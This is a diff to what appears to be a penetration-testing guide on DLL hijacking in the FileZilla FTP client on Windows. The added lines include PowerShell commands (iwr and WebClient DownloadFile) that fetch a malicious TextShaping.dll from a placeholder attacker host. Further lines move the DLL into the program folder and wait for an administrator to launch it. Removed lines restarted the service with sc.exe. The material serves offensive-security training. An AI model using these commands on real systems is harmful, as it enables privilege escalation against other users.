@@ -146,9 +146,16 @@ Host the DLL on your attacker machine and download it to the writable directory 
    ```
 2. On the target system, download the DLL using PowerShell:
    ```powershell
-   iwr -uri http://<attacker_ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+   iwr -uri http://<attacker_ip>/TextShaping.dll -OutFile 'TextShaping.dll'
    ```
-3. Confirm the file exists:
+   ```powershell
+   powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/TextShaping.dll', 'TextShaping.dll')"
+   ```
+3. Move File
+   ```powershell
+   move TextShaping.dll 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+   ```
+4. Confirm the file exists:
    ```powershell
    ls 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
    ```
@@ -156,24 +163,9 @@ Host the DLL on your attacker machine and download it to the writable directory 
 ---
 
 ### Step 5: Trigger the DLL Hijacking
-Once the malicious DLL is in place, the application or service must load it. This can happen automatically when:
+The DLL hijacking will occur when a higher-privileged user or system process runs the application. For example, when the `FileZilla` application is executed by an administrator or another user with elevated permissions, the malicious DLL will be loaded from the writable directory.
 
-- The application starts.
-- The service restarts.
-
-If you have permissions to restart the service, use:
-```powershell
-sc.exe stop <service_name>
-sc.exe start <service_name>
-```
-
-**Example**:
-```powershell
-sc.exe stop FileZillaService
-sc.exe start FileZillaService
-```
-
-If you cannot manually restart the service, wait for a higher-privileged user to trigger the application or service.
+Wait for the application to be executed by someone with higher privileges.
 
 ---
 
